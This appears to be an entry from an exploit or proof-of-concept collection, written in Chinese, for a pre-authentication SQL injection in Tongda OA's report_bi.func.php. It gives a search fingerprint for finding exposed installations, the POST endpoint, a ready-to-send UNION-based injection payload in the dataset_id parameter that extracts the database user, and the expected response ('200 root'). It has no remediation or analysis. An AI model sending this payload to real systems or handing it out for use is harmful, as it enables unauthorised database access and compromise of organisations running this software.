# 通达OAreport_bi前台SQL注入漏洞

通达OA ｜ SQL注入 ｜ —
- **指纹**：`title="office Anywhere"`
- **请求**：`POST /general/bi\_design/appcenter/report\_bi.func.php HTTP/1.1`

**Payload**
```
\_POST\[dataset\_id]=efgh'-@`'`)union select 1,2,user()#'\&action=get\_link\_info&
```
- **响应特征**：200 root